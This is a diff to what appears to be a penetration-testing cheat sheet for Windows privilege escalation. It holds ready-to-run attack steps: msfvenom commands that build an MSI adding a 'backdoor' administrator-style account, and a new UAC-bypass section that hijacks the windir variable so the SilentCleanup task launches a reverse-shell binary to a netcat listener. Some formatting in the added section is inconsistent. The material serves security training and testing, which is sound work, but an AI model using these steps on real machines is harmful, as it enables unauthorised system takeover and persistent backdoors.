@@ -816,6 +816,35 @@ $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi
 $ msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi-nouac -o evil.msi
 $ msiexec /quiet /qn /i C:\evil.msi
 ```
+
+### Bypass UAC
+''' 
+whoami /all
+```
+If user is running at a medium mandatory level (Mandatory Label\Medium Mandatory Level).
+
+Task Scheduler task in order to bypass UAC. We will exploit the task
+'DiskCleanup'
+
+The environmental variable that this task uses is %windir%. This variable simply resolves to
+"C:\WINDOWS", and is used to find the windows directory. The reason why this task uses this
+environmental variable is to run a command that is located within the %windir% directory.
+
+We will change the environmental variable to be:
+```
+"cmd.exe /c C:\reverse.exe EXEC:cmd.exe,pipes &REM "
+```
+```
+reg add "HKCU\Environment" /v "windir" /d "cmd.exe /c C:\reverse.exe EXEC:cmd.exe.pipes &REM " /f
+```
+start up a netcat listener on port 4444
+restart the service
+```
+schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I
+```
+
+
+
 ### Juicy Potato
 Versions
 Windows_10_Enterprise
@@ -982,6 +1011,11 @@ hashcat -m 1000
 hashcat -m 5600
 #MYSQL file hashes
 mysql-sha1
+```
+
+### Evil winrm tips
+```
+Once in if on windows do whoami /all to see users groups
 ```
 ### File permissions to run
 ```
